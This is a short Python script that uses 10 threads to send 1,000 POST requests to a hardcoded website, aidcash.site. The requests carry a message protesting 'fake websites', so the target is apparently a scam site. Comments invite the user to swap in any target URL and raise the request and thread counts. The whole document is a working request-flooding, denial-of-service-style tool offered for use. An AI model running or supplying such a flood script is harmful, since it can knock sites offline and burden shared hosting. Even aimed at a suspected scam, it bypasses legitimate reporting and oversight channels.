import requests
import threading

def spam():
    url = 'http://aidcash.site/1/' # enter the target url here
    data = { # you can provide a json file, or any data type you want to send
        'Stop': 'creating',
        'fake' : 'websites',
        'that\'s': 'not',
        'good' : 'man!'
        }
    for _ in range(100): # provide how many requests you want
        sending_data = requests.post(
            url,
            data=data,
            allow_redirects=False
            )

        print(f"\nResponse code: {sending_data.status_code}")

# creating threads for running the function plenty of times at the same moment
threads = []

for _ in range(10): # provide how many threads to execute the spam function
    t = threading.Thread(target=spam)
    t.start()
    threads.append(t)

for thread in threads:
    thread.join()

